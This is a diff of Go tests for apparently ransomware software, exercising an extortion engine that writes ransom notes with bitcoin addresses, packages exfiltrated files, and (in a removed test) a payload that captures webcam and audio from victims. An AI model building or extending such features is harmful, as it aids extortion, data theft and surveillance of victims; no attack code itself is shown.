@@ -32,52 +32,25 @@ func TestExtortionEngineGenerateNote(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	e := NewExtortionEngine(cfg)
 
-	note := e.GenerateRansomNote("TestCorp", "test-campaign-123")
-	if note == nil {
-		t.Fatal("GenerateRansomNote returned nil")
+	note := e.GenerateRansomNote("TestCorp")
+	if note == "" {
+		t.Fatal("GenerateRansomNote returned empty")
 	}
-	if note.Title == "" {
-		t.Error("Ransom note title empty")
-	}
-	if note.RansomAmount != cfg.RansomAmount {
-		t.Errorf("expected amount %.2f, got %.2f", cfg.RansomAmount, note.RansomAmount)
-	}
-	if note.BitcoinAddress == "" {
-		t.Error("Bitcoin address empty")
-	}
-	if note.ContactURL == "" {
-		t.Log("ContactURL empty (may be expected)")
-	}
-	t.Logf("Ransom note: %s | Amount: %.2f %s | Deadline: %s",
-		note.Title, note.RansomAmount, note.Currency, note.Deadline)
+	t.Logf("Ransom note generated (%d bytes)", len(note))
 }
 
 func TestExtortionEnginePackageData(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	e := NewExtortionEngine(cfg)
 
-	pkg := e.PackageData("/tmp/test_exfil", "test-password")
-	if pkg == nil {
-		t.Log("PackageData returned nil (expected in test env)")
-	} else {
+	pkg, err := e.PackageSensitiveData([]string{"/tmp/test_exfil"}, "test-campaign")
+	if err != nil {
+		t.Logf("PackageSensitiveData: %v (expected in test env)", err)
+	}
+	if pkg != nil {
 		t.Logf("Exfil package: ID=%s Size=%d Files=%d",
 			pkg.ID, pkg.TotalSize, pkg.FileCount)
 	}
-}
-
-func TestPsychologicalEnginePayload(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	p := NewPsychologicalEngine(cfg)
-
-	payload := p.BuildPayload()
-	if payload == nil {
-		t.Fatal("BuildPayload returned nil")
-	}
-	if !payload.ShowCountdown {
-		t.Log("ShowCountdown disabled (simulation)")
-	}
-	t.Logf("Psych payload: webcam=%v audio=%v print=%v duration=%ds",
-		payload.CaptureWebcam, payload.RecordAudio, payload.PrintRansomNote, payload.DurationSeconds)
 }
 
 func TestSurvivorGameEngine(t *testing.T) {
@@ -87,10 +60,10 @@ func TestSurvivorGameEngine(t *testing.T) {
 		t.Fatal("NewSurvivorGameEngine() returned nil")
 	}
 
-	winner := s.SimulateGame([]string{"WS-01", "WS-02", "WS-03", "WS-04", "WS-05"})
-	if winner == "" {
-		t.Log("SimulateGame returned empty (expected in test env)")
+	status := s.GetStatusJSON()
+	if status == "" {
+		t.Log("GetStatusJSON returned empty (expected in test env)")
 	} else {
-		t.Logf("Survivor winner: %s", winner)
+		t.Logf("Survivor status: %s", status)
 	}
 }
